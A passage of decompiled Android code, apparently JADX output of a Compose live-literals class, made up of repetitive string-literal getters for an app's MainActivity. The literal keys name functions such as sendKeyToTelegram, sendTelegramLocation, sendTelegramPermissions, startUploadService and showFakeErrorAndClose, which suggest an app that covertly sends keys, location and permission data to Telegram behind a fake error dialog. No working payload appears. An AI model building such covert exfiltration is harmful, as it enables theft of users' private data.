            f۱۰۷State$String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", offset = 21657)
    /* JADX INFO: renamed from: String$arg-0$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    public final String m۷۵String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۶String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۸State$String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", f۱۶۶String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity);
            f۱۰۸State$String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", offset = 21778)
    /* JADX INFO: renamed from: String$arg-0$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    public final String m۷۶String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۷String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۹State$String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", f۱۶۷String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity);
            f۱۰۹State$String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17559)
    /* JADX INFO: renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۷۷String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۸String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۰State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۶۸String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۱۱۰State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16754)
    /* JADX INFO: renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۷۸String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۹String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۱State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۶۹String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۱۱۱State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20333)
    /* JADX INFO: renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۷۹String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۰String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۲State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۷۰String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۱۱۲State$String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17643)
    /* JADX INFO: renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۸۰String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۱String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۳State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۷۱String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۱۱۳State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16838)
    /* JADX INFO: renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۸۱String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۲String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۴State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۷۲String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۱۱۴State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20417)
    /* JADX INFO: renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۸۲String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۳String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۵State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۷۳String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۱۱۵State$String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setTitle$$this$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", offset = 21620)
    /* JADX INFO: renamed from: String$arg-0$call-setTitle$$this$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    public final String m۸۳String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۴String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۶State$String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setTitle$$this$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", f۱۷۴String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity);
            f۱۱۶State$String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17421)
    /* JADX INFO: renamed from: String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۸۴String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۵String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۷State$String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۷۵String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۱۱۷State$String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20209)
    /* JADX INFO: renamed from: String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۸۵String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۶String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۸State$String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۷۶String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۱۱۸State$String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-makeText$$this$call-show$catch$fun-setupWebView$class-MainActivity", offset = 12515)
    /* JADX INFO: renamed from: String$arg-1$call-makeText$$this$call-show$catch$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final String m۸۶String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۷String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۱۹State$String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-makeText$$this$call-show$catch$fun-setupWebView$class-MainActivity", f۱۷۷String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity);
            f۱۱۹State$String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-makeText$$this$call-show$catch$fun-startUploadService$class-MainActivity", offset = 15413)
    /* JADX INFO: renamed from: String$arg-1$call-makeText$$this$call-show$catch$fun-startUploadService$class-MainActivity, reason: not valid java name */
    public final String m۸۷String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۸String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۲۰State$String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-makeText$$this$call-show$catch$fun-startUploadService$class-MainActivity", f۱۷۸String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity);
            f۱۲۰State$String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17659)
    /* JADX INFO: renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۸۸String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷۹String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۲۱State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۷۹String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۱۲۱State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16854)
    /* JADX INFO: renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۸۹String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۸۰String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۲۲State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۸۰String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۱۲۲State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20433)
    /* JADX INFO: renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۹۰String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۸۱String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۲۳State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۸۱String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۱۲۳State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }
}